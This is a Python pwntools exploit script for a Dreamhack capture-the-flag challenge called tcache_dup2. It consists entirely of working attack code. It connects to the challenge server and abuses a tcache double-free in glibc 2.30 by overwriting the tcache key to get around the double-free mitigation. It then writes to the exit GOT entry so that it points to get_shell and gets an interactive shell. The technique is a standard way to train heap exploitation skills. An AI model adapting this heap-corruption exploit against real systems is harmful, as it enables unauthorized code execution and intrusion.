from pwn import *

p = remote("host8.dreamhack.games", 18382)
e = ELF("/mnt/c/Users/Storm/ctf/tcache_dup2")
libc = ELF("/mnt/c/Users/Storm/ctf/libc-2.30.so")

get_shell = e.symbols['get_shell']
exit = e.got['exit']

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())


# 1. setup tcache->counts[tc_idx]
create(0x10, b'AAAAAAAA')
create(0x10, b'BBBBBBBB')
create(0x10, b'CCCCCCCC')
delete(2)
delete(1)
delete(0)
# 2. overwrite key to bypass mitigation
modify(0, 16, b'AAAAAAAAAAAAAAAA')
# 3. trigger double free bug
delete(0)
# 4. aaw to exit_got with get_shell
create(0x10, p64(e.got['exit']))
create(0x10, b'BBBBBBBB')
create(0x10, p64(e.symbols['get_shell']))
# 5. trigger exit() to get shell
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7')

p.interactive()